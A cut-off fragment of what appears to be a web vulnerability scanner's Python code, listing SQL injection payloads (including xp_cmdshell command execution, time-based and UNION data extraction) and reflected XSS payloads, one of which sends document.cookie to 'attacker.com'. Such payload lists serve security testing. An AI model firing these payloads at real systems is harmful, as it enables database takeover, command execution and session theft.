    ...
    return {
        ...
        "sql_injection": {
            "payloads": [
                ...
                "' OR 1=1 AND 'custom'='custom'--",
                "'; EXEC xp_cmdshell('whoami');--",
                "' OR 1=1 ORDER BY 1--",
                "' UNION SELECT NULL,NULL,NULL--",
                "' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
                "' OR 1=1 GROUP BY 1,2,3,4,5--",
                "' UNION SELECT version(),user(),database()--"
            ],
            "description": "Enhanced SQL Injection payloads for database manipulation",
            "owasp": "A03:2021-Injection",
            "severity": "Critical",
        ...
        "reflected_xss": {
            "payloads": [
                ...
                "<script>new Image().src='http://attacker.com/steal?data='+document.cookie</script>",
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "<iframe src='javascript:alert(1)'></iframe>",
